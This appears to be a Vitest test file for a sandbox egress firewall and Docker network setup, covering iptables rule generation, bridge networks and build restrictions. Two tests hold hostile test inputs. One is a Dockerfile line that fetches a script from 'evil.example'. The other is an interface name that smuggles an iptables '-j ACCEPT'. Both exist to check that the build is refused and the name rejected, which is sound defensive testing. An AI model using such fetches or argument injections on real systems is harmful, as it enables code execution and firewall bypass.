import { mkdtempSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { installFirewall, removeFirewall, renderFirewall, type FirewallPlan } from "../../src/egress/firewall.js";
import { ensureSandboxNetwork, networkCreateArgs, parseNetworkInspect } from "../../src/egress/networks.js";
import { EGRESS_NETWORKS } from "../../src/egress/policy.js";
import { sandboxBuildArgs, sandboxRunArgs, setSandboxNetworking } from "../../src/egress/sandboxNetworking.js";
import { AppRunner, dockerBuildArgs, DEFAULT_DOCKER_BUILD_LIMITS, runDockerBuild, type CommandRunner } from "../../src/serviceRunner.js";

const PLAN: FirewallPlan = {
  bridges: [
    { kind: "build", bridge: "fs-build" },
    { kind: "staging", bridge: "fs-staging" },
    { kind: "apps", bridge: "fs-apps" },
  ],
  ports: { tls: 15443, http: 15080, dns: 15053 },
  dataPorts: [5432, 6379, 9000],
};

class Rec implements CommandRunner {
  calls: Array<{ cmd: string; args: string[] }> = [];
  constructor(private readonly fail: (cmd: string, args: string[]) => boolean = () => false, private readonly out: (args: string[]) => string = () => "") {}
  async run(cmd: string, args: string[]) {
    this.calls.push({ cmd, args });
    if (this.fail(cmd, args)) throw new Error(`${cmd} failed`);
  }
  async capture(cmd: string, args: string[]) {
    this.calls.push({ cmd, args });
    if (this.fail(cmd, args)) throw new Error(`${cmd} failed`);
    return { stdout: this.out(args), stderr: "" };
  }
}

afterEach(() => setSandboxNetworking(null));

describe("firewall rules", () => {
  it("redirects 80/443/53 from every bridge to the gateway", () => {
    const { v4 } = renderFirewall(PLAN);
    for (const b of ["fs-build", "fs-staging", "fs-apps"]) {
      expect(v4).toContain(`-A FLAGSHIP-EGRESS-NAT -i ${b} -p tcp --dport 443 -j REDIRECT --to-ports 15443`);
      expect(v4).toContain(`-A FLAGSHIP-EGRESS-NAT -i ${b} -p tcp --dport 80 -j REDIRECT --to-ports 15080`);
      expect(v4).toContain(`-A FLAGSHIP-EGRESS-NAT -i ${b} -p udp --dport 53 -j REDIRECT --to-ports 15053`);
      expect(v4).toContain(`-A FLAGSHIP-EGRESS-NAT -i ${b} -p tcp --dport 53 -j REDIRECT --to-ports 15053`);
      expect(v4).toContain(`-A FLAGSHIP-EGRESS-FWD -i ${b} -j REJECT --reject-with icmp-admin-prohibited`);
      expect(v4).toContain(`-A FLAGSHIP-EGRESS-IN -i ${b} -p tcp -m multiport --dports 15443,15080,15053 -j ACCEPT`);
    }
  });

  it("lets apps and staging, not builds, reach the data-service ports", () => {
    const { v4 } = renderFirewall(PLAN);
    expect(v4).toContain("-A FLAGSHIP-EGRESS-IN -i fs-apps -p tcp -m multiport --dports 5432,6379,9000 -j ACCEPT");
    expect(v4).toContain("-A FLAGSHIP-EGRESS-IN -i fs-staging -p tcp -m multiport --dports 5432,6379,9000 -j ACCEPT");
    expect(v4).not.toContain("-i fs-build -p tcp -m multiport --dports 5432");
  });

  it("orders accept-before-reject per bridge and declares (so atomically flushes) only its own chains", () => {
    const { v4, v6 } = renderFirewall(PLAN);
    const lines = v4.split("\n");
    const accept = lines.indexOf("-A FLAGSHIP-EGRESS-IN -i fs-apps -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT");
    const reject = lines.indexOf("-A FLAGSHIP-EGRESS-IN -i fs-apps -j REJECT --reject-with icmp-admin-prohibited");
    expect(accept).toBeGreaterThan(-1);
    expect(reject).toBeGreaterThan(accept);
    expect(lines.filter((l) => l.startsWith(":"))).toEqual([":FLAGSHIP-EGRESS-NAT - [0:0]", ":FLAGSHIP-EGRESS-FWD - [0:0]", ":FLAGSHIP-EGRESS-IN - [0:0]"]);
    expect(v6).toContain("-A FLAGSHIP-EGRESS6 -i fs-apps -j REJECT");
  });

  it("refuses an interface name iptables would misread", () => {
    expect(() => renderFirewall({ ...PLAN, bridges: [{ kind: "apps", bridge: "fs apps -j ACCEPT" }] })).toThrow();
  });

  it("installs idempotently: restore, then hook only missing jumps", async () => {
    const dir = mkdtempSync(join(tmpdir(), "fw-"));
    const rec = new Rec((cmd, args) => args.includes("-C") && args.includes("PREROUTING"));
    await installFirewall(rec, PLAN, { rulesDir: dir });
    const restores = rec.calls.filter((c) => c.cmd.endsWith("-restore"));
    expect(restores.map((c) => c.args)).toEqual([
      ["-w", "--noflush", `${dir}/flagship-egress.v4.rules`],
      ["-w", "--noflush", `${dir}/flagship-egress.v6.rules`],
    ]);
    expect(readFileSync(`${dir}/flagship-egress.v4.rules`, "utf8")).toBe(renderFirewall(PLAN).v4);
    const inserts = rec.calls.filter((c) => c.args.includes("-I")).map((c) => c.args.join(" "));
    expect(inserts).toEqual(["-w -t nat -I PREROUTING 1 -j FLAGSHIP-EGRESS-NAT"]);
  });

  it("an IPv4 failure throws, an IPv6 one doesn't", async () => {
    const dir = mkdtempSync(join(tmpdir(), "fw-"));
    await expect(installFirewall(new Rec((cmd) => cmd === "iptables-restore"), PLAN, { rulesDir: dir })).rejects.toThrow();
    const logs: string[] = [];
    await installFirewall(new Rec((cmd) => cmd.startsWith("ip6tables")), PLAN, { rulesDir: dir, log: (m) => logs.push(m) });
    expect(logs.join()).toMatch(/IPv6 rules not installed/);
  });

  it("removes every hook and chain", async () => {
    let deletes = 0;
    const rec = new Rec((_c, args) => args.includes("-D") && deletes++ % 2 === 1);
    await removeFirewall(rec);
    const flat = rec.calls.map((c) => `${c.cmd} ${c.args.join(" ")}`);
    for (const chain of ["FLAGSHIP-EGRESS-NAT", "FLAGSHIP-EGRESS-FWD", "FLAGSHIP-EGRESS-IN", "FLAGSHIP-EGRESS6"]) {
      expect(flat.some((l) => l.includes(`-X ${chain}`))).toBe(true);
    }
    expect(flat).toContain("iptables -w -t filter -D DOCKER-USER -j FLAGSHIP-EGRESS-FWD");
  });
});

describe("sandbox networks", () => {
  const inspect = (o: Record<string, unknown>) =>
    JSON.stringify({ Id: "0123456789abcdef", Name: "flagship-apps", Internal: false, Options: {}, IPAM: { Config: [{ Subnet: "172.22.0.0/16", Gateway: "172.22.0.1" }] }, Containers: { x: { Name: "flagship-harry-weather", IPv4Address: "172.22.0.2/16" } }, ...o });

  it("creates each with its fixed bridge name; only the build bridge is internal", () => {
    expect(networkCreateArgs("flagship-build")).toEqual(["network", "create", "--driver", "bridge", "--internal", "-o", "com.docker.network.bridge.name=fs-build", "flagship-build"]);
    expect(networkCreateArgs("flagship-staging")).toEqual(["network", "create", "--driver", "bridge", "-o", "com.docker.network.bridge.name=fs-staging", "flagship-staging"]);
    expect(networkCreateArgs("other")).toEqual(["network", "create", "other"]);
    expect(EGRESS_NETWORKS.map((n) => n.bridge.length <= 15)).toEqual([true, true, true]);
  });

  it("parses docker network inspect", () => {
    expect(parseNetworkInspect(inspect({}))).toEqual({
      id: "0123456789abcdef",
      name: "flagship-apps",
      bridge: "br-0123456789ab",
      internal: false,
      subnets: ["172.22.0.0/16"],
      gateways: ["172.22.0.1"],
      containers: [{ name: "flagship-harry-weather", ipv4: "172.22.0.2" }],
    });
    expect(parseNetworkInspect("not json")).toBeNull();
  });

  it("recreates a legacy network (no fixed bridge name), disconnecting its containers first", async () => {
    let created = false;
    const rec = new Rec(
      () => false,
      () => (created ? inspect({ Options: { "com.docker.network.bridge.name": "fs-apps" }, Containers: {} }) : inspect({})),
    );
    const origRun = rec.run.bind(rec);
    rec.run = async (cmd, args) => {
      await origRun(cmd, args);
      if (args[1] === "create") created = true;
    };
    const spec = EGRESS_NETWORKS.find((n) => n.kind === "apps")!;
    const info = await ensureSandboxNetwork(rec, spec);
    expect(info.bridge).toBe("fs-apps");
    const runs = rec.calls.filter((c) => c.args[0] === "network" && c.args[1] !== "inspect").map((c) => c.args.slice(0, 3).join(" "));
    expect(runs).toEqual(["network disconnect -f", "network rm flagship-apps", "network create --driver"]);
  });

  it("keeps the existing bridge when it can't be removed", async () => {
    const rec = new Rec((_c, args) => args[1] === "rm", () => inspect({}));
    const info = await ensureSandboxNetwork(rec, EGRESS_NETWORKS.find((n) => n.kind === "apps")!);
    expect(info.bridge).toBe("br-0123456789ab");
  });
});

describe("docker args once the gateway enforces", () => {
  it("app containers get the gateway's DNS and their data alias on it", async () => {
    const rec = new Rec();
    const runner = new AppRunner(rec);
    await runner.deploy({ serviceId: "harry-weather", image: "x:1" });
    expect(rec.calls.at(-1)!.args).toContain("host.flagship.internal:host-gateway");
    expect(rec.calls.at(-1)!.args).not.toContain("--dns");

    setSandboxNetworking({ gateways: new Map([["flagship-apps", "172.22.0.1"], ["flagship-staging", "172.21.0.1"]]), buildHosts: ["registry.npmjs.org"] });
    await runner.deploy({ serviceId: "harry-weather", image: "x:1" });
    const args = rec.calls.at(-1)!.args;
    expect(args).toContain("host.flagship.internal:172.22.0.1");
    expect(args[args.indexOf("--dns") + 1]).toBe("172.22.0.1");
    const staging = new AppRunner(rec, { limits: { network: "flagship-staging" } });
    await staging.deploy({ serviceId: "stg-b1", image: "x:1" });
    expect(rec.calls.at(-1)!.args.join(" ")).toContain("--dns 172.21.0.1 --add-host host.flagship.internal:172.21.0.1");
    expect(sandboxRunArgs("some-other-net", "h")).toBeNull();
  });

  it("builds pin each registry host to the build gateway", () => {
    expect(sandboxBuildArgs("flagship-build")).toEqual([]);
    setSandboxNetworking({ gateways: new Map([["flagship-build", "172.24.0.1"]]), buildHosts: ["registry.npmjs.org", "pypi.org", "*.skip.me"] });
    const args = dockerBuildArgs("img:1", "/var/flagship/data/app-clones/x", DEFAULT_DOCKER_BUILD_LIMITS);
    expect(args.slice(0, 7)).toEqual(["build", "--network", "flagship-build", "--add-host", "registry.npmjs.org:172.24.0.1", "--add-host", "pypi.org:172.24.0.1"]);
    expect(args.at(-1)).toBe("/var/flagship/data/app-clones/x");
  });

  it("refuses to build a Dockerfile that would fetch outside the sandbox", async () => {
    const dir = mkdtempSync(join(tmpdir(), "ctx-"));
    const { writeFileSync } = await import("node:fs");
    writeFileSync(join(dir, "Dockerfile"), "FROM node:20\nADD https://evil.example/x.sh /x.sh\n");
    const rec = new Rec();
    await expect(runDockerBuild(rec, "img:1", dir)).rejects.toThrow(/not allowed on this box[\s\S]*line 2: ADD https:\/\/evil\.example\/x\.sh/);
    expect(rec.calls).toEqual([]);
  });
});

describe("without the gateway", () => {
  it("keeps the fixed bridge names but makes the build bridge routable again", async () => {
    const { ensureUnfencedNetworks } = await import("../../src/egress/networks.js");
    let buildInternal = true;
    const rec = new Rec(
      () => false,
      (args) =>
        JSON.stringify({
          Id: `${args[2]}-0000000000`,
          Name: args[2],
          Internal: args[2] === "flagship-build" ? buildInternal : false,
          Options: { "com.docker.network.bridge.name": EGRESS_NETWORKS.find((n) => n.network === args[2])!.bridge },
          IPAM: { Config: [] },
          Containers: {},
        }),
    );
    const origRun = rec.run.bind(rec);
    rec.run = async (cmd, args) => {
      await origRun(cmd, args);
      if (args[1] === "rm") buildInternal = false;
    };
    await ensureUnfencedNetworks(rec);
    const mutations = rec.calls.filter((c) => c.args[0] === "network" && c.args[1] !== "inspect").map((c) => c.args.join(" "));
    expect(mutations).toEqual(["network rm flagship-build", "network create --driver bridge -o com.docker.network.bridge.name=fs-build flagship-build"]);
  });
});
